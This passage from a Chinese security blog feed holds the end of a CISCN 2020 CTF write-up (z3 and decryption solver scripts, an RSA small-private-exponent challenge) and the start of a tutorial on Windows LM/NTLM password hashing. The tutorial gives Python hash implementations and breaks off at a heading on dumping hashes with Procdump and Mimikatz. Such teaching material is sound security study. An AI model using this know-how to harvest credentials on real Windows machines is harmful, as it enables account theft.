<span class="number">9</span> * v84 + <span class="number">62</span> * v85 + <span class="number">37</span> * v86 + <span class="number">84</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">48</span> * v85 + <span class="number">14</span> * v83 + <span class="number">23</span> * v81 + <span class="number">6</span> * v82 + <span class="number">74</span> * v84 + <span class="number">12</span> * v86 + <span class="number">83</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">15</span> * v86 + <span class="number">48</span> * v85 + <span class="number">92</span> * v83 + <span class="number">85</span> * v82 + <span class="number">27</span> * v81 + <span class="number">42</span> * v84 + <span class="number">72</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line">s.add(<span class="number">26</span> * v86 + <span class="number">67</span> * v84 + <span class="number">6</span> * v82 + <span class="number">4</span> * v81 + <span class="number">3</span> * v83 + <span class="number">68</span> * v87 == struct.unpack_from(<span class="string">&quot;&lt;I&quot;</span>, data, offset)[<span class="number">0</span>])</span><br><span class="line">offset += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line">m = s.model()</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v46]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v47]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v48]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v49]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v50]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v51]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v52]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v53]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v54]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v55]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v56]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v57]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v58]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v59]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v60]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v61]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v62]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v63]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v64]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v65]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v66]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v67]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v68]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v69]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v70]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v71]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v72]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v73]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v74]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v75]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v76]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v77]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v78]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v79]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v80]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v81]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v82]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v83]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v84]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v85]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v86]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">print(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[v87]))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="0x02-hyperthreading"><a href="#0x02-hyperthreading" class="headerlink" title="0x02 hyperthreading"></a>0x02 hyperthreading</h3><p>去掉花指令后f5：</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-9.png" alt="ciscn2020-9"></p><p><code>sub_401200</code>和<code>sub_401240</code>为反调试线程</p><p> <img src="https://oss.zjun.info/zjun.info/ciscn2020-10.png" alt="ciscn2020-10"></p><p>根据StartAddress得出解密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0xDD</span>, <span class="number">0x5B</span>, <span class="number">0x9E</span>, <span class="number">0x1D</span>, <span class="number">0x20</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x90</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0xDE</span>, <span class="number">0x8B</span>, <span class="number">0x11</span>, <span class="number">0xD1</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>,</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x8B</span>, <span class="number">0x9E</span>, <span class="number">0x5D</span>, <span class="number">0x5D</span>, <span class="number">0x11</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0x12</span>, <span class="number">0x91</span>, <span class="number">0x50</span>, <span class="number">0x12</span>, <span class="number">0xD2</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>,</span><br><span class="line">    <span class="number">0xD2</span>, <span class="number">0x9F</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    temp = ((i - <span class="number">0x23</span>) &amp; <span class="number">0xFF</span>) ^ <span class="number">0x23</span></span><br><span class="line">    print(<span class="built_in">chr</span>(((temp &gt;&gt; <span class="number">6</span>) | (temp &lt;&lt; <span class="number">2</span>)) &amp; <span class="number">0xFF</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x01-bd"><a href="#0x01-bd" class="headerlink" title="0x01 bd"></a>0x01 bd</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    d = getRandomNBitInteger(<span class="number">200</span>)</span><br><span class="line">    <span class="keyword">if</span> GCD(d, phi) == <span class="number">1</span>:</span><br><span class="line">        e = inverse(d, phi)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line">print(c, e, N, sep=<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line"><span class="comment"># 46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line"><span class="comment"># 86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br></pre></td></tr></table></figure><p>已知c、e、N，利用3summer师傅的开源工具<a href="https://github.com/3summer/CTF-RSA-tool">CTF-RSA-tool</a>，可直接解出flag。</p><p><img src="https://oss.zjun.info/zjun.info/ciscn2020-11.png" alt="ciscn2020-11"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> CISCN-2020 </tag>
            
            <tag> 全国大学生信息安全竞赛创新实践能力赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由Windows本地认证到Hash抓取</title>
      <link href="2020/from-windows-local-authentication-to-obtaining-hash.html"/>
      <url>2020/from-windows-local-authentication-to-obtaining-hash.html</url>
      
        <content type="html"><![CDATA[<p>首发先知社区：<a href="https://xz.aliyun.com/t/8127">https://xz.aliyun.com/t/8127</a></p><p><code>Windows</code>本地登陆密码储存在位于<code>%SystemRoot%\system32\config\</code>目录的<code>SAM</code>文件中，存储内容为密码的<code>hash</code>值。当用户输入密码时，<code>Windows</code>先将用户的输入通过算法加密再与<code>SAM</code>文件存储的数据对比，一致则认证成功。</p><a id="more"></a><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-1.webp" alt="lmhash-ntlmhash-1"></p><p><code>Windows</code>所使用的密码<code>hash</code>有两种，<code>LM Hash</code>与<code>NTLM hash</code>。</p><h2 id="0x01-LM-Hash"><a href="#0x01-LM-Hash" class="headerlink" title="0x01 LM Hash"></a>0x01 LM Hash</h2><p><code>LM</code> 全称<code>LAN Manager</code> ，<code>LM hash</code>作为<code>Windows</code>使用较早的认证协议，现已基本淘汰，仅存在于较老的系统中，如<code>Windows XP、Windows 2000、Windows 2003</code>这一类。</p><p><code>LM hash</code>算法如下:</p><ul><li>将密码转换为大写,并转换为<code>16进制</code>字符串。</li><li>密码不足<code>28位</code>，用<code>0</code>在右边补全。</li><li><code>28位</code>的密码被分成两个<code>14位</code>部分，每部分分别转换成比特流，并且长度为<code>56</code>位，长度不足用<code>0</code>在左边补齐长度。</li><li>两组分别再分<code>7位</code>一组末尾加<code>0</code>，再组合成一段新的字符，再转为<code>16</code>进制。</li><li>两组<code>16进制</code>数，分别作为<code>DES key</code>，并为<code>KGS!@#$%</code>进行加密。</li><li>将两组<code>DES</code>加密后的编码拼接，得到<code>LM HASH</code>值。</li></ul><p><code>Python3</code>实现<code>LM hash</code>算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Key</span>):</span></span><br><span class="line">    k = des(Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ZeroPadding</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    passwd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    print(<span class="string">&#x27;你的输入是:&#x27;</span>, passwd)</span><br><span class="line">    print(<span class="string">&#x27;转化为大写:&#x27;</span>, passwd.upper())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    passwd = codecs.encode(passwd.upper().encode(), <span class="string">&#x27;hex_codec&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;转为hex:&#x27;</span>, passwd.decode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足28位，用0在右边补全</span></span><br><span class="line">    passwd_len = <span class="built_in">len</span>(passwd)</span><br><span class="line">    <span class="keyword">if</span> passwd_len &lt; <span class="number">28</span>:</span><br><span class="line">        passwd = passwd.decode().ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;补齐28位:&#x27;</span>, passwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 28位的密码被分成两个14位部分</span></span><br><span class="line">    PartOne = passwd[<span class="number">0</span>:<span class="number">14</span>]</span><br><span class="line">    PartTwo = passwd[<span class="number">14</span>:]</span><br><span class="line">    print(<span class="string">&#x27;两组14位的部分:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分分别转换成比特流，并且长度为56位，长度不足用0在左边补齐长度</span></span><br><span class="line">    PartOne = <span class="built_in">bin</span>(<span class="built_in">int</span>(PartOne, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    PartTwo = <span class="built_in">bin</span>(<span class="built_in">int</span>(PartTwo, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;两组56位比特流:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 两组分别再分为7位一组末尾加0，再分别组合成新的字符</span></span><br><span class="line">    PartOne = ZeroPadding(PartOne)</span><br><span class="line">    PartTwo = ZeroPadding(PartTwo)</span><br><span class="line">    print(<span class="string">&#x27;两组再7位一组末尾加0:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 两组数据转hex</span></span><br><span class="line">    PartOne = <span class="built_in">hex</span>(<span class="built_in">int</span>(PartOne, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    PartTwo = <span class="built_in">hex</span>(<span class="built_in">int</span>(PartTwo, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == PartTwo:</span><br><span class="line">        PartTwo = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;两组转为hex:&#x27;</span>, PartOne, PartTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 16位的二组数据，分别作为DES key为&quot;KGS!@#$%&quot;进行加密。</span></span><br><span class="line">    LMOne = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, binascii.a2b_hex(PartOne)).decode()</span><br><span class="line">    LMTwo = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, binascii.a2b_hex(PartTwo)).decode()</span><br><span class="line">    print(<span class="string">&#x27;两组DES加密结果:&#x27;</span>, LMOne, LMTwo)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将二组DES加密后的编码拼接，得到LM HASH值。</span></span><br><span class="line">    LM = LMOne + LMTwo</span><br><span class="line">    print(<span class="string">&#x27;LM hash:&#x27;</span>, LM)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>代码参考：<a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p><p>当密码为<code>123ABC</code>或<code>123456</code>时如下：</p><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-2.webp" alt="lmhash-ntlmhash-2"></p><p><code>LM Hash</code>的缺陷在于：</p><ul><li>密码不区分大小写。</li><li>密码长度最大只能为<code>14个</code>字符。</li><li>根据以上的图，可以发现当我们的密码不超过<code>7位</code>时，生成的<code>LM hash</code>后面的一半是固定的为<code>aad3b435b51404ee</code>，也就是说通过观察<code>LM hash</code>，够判断用户的密码是否是大于等于<code>7位</code>。</li><li>哈希值没有加盐就进行验证，这使其容易受到中间人的攻击，例如哈希传递，还允许构建彩虹表。</li></ul><h2 id="0x02-NTLM-Hash"><a href="#0x02-NTLM-Hash" class="headerlink" title="0x02 NTLM Hash"></a>0x02 NTLM Hash</h2><p><code>NTLM</code>全称<code>NT LAN Manager</code>， 目前<code>Windows</code>基本都使用<code>NTLM hash</code>。</p><p><code>NTLM hash</code>算法如下：</p><ul><li>将用户输入转为<code>16进制</code></li><li>再经<code>Unicode</code>编码</li><li>再调用<code>MD4</code>加密算法</li></ul><p><code>Python2</code>实现<code>NTLM hash</code>算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> MD4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UnicodeEncode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">int</span>(<span class="built_in">len</span>(<span class="built_in">str</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        b.append((<span class="built_in">str</span>[i * <span class="number">2</span>:<span class="number">2</span> * i + <span class="number">2</span>]) + <span class="string">&#x27;00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Md4Encode</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    h = MD4.new()</span><br><span class="line">    h.update(<span class="built_in">str</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> h.hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    passwd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    print(<span class="string">&#x27;Input: &#x27;</span> + passwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转hex</span></span><br><span class="line">    passwd = codecs.encode(passwd.encode(), <span class="string">&#x27;hex_codec&#x27;</span>).decode()</span><br><span class="line">    print(<span class="string">&#x27;Hex: &#x27;</span> + passwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转Unicode</span></span><br><span class="line">    passwd = UnicodeEncode(passwd)</span><br><span class="line">    print(<span class="string">&#x27;Unicode: &#x27;</span> + passwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转md4</span></span><br><span class="line">    NTLMhash = Md4Encode(passwd)</span><br><span class="line">    print(<span class="string">&#x27;NTLMhash: &#x27;</span> + NTLMhash)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后来在篇文章上发现了更简单的代码表现：</p><p>见<a href="https://www.anquanke.com/post/id/193149#h3-3">https://www.anquanke.com/post/id/193149#h3-3</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii,sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, sys.argv[<span class="number">1</span>].encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如<code>admin</code>经<code>NTLM hash</code>后存储的值便是<code>209c6174da490caeb422f3fa5a7ae634</code>。</p><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-3.webp" alt="lmhash-ntlmhash-3"></p><p><code>NTLM Hash</code>在算法上比<code>LM Hash</code>安全性更高一些。</p><h2 id="0x03-本地认证流程"><a href="#0x03-本地认证流程" class="headerlink" title="0x03 本地认证流程"></a>0x03 本地认证流程</h2><p>简洁的描述一下大致流程，当然实际上会复杂很多。</p><p>用户通过<code>winlogon.exe</code>输入密码，<code>lsass.exe</code>进程接收密码明文后，会存在内存之中并将其加密成<code>NTLM hash</code>，再对<code>SAM</code>存储数据进行比较认证。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">st&#x3D;&gt;start: winlogon.exe</span><br><span class="line">op&#x3D;&gt;operation: User input</span><br><span class="line">cond&#x3D;&gt;condition: 转为NTLM hash与SAM文件对比</span><br><span class="line">ioyes&#x3D;&gt;inputoutput: 认证成功</span><br><span class="line">iono&#x3D;&gt;inputoutput: 认证失败</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;ioyes</span><br><span class="line">cond(no)-&gt;iono</span><br></pre></td></tr></table></figure><h2 id="0x04-Procdump-Mimikatz读取密码Hash"><a href="#0x04-Procdump-Mimikatz读取密码Hash" class="headerlink" title="0x04 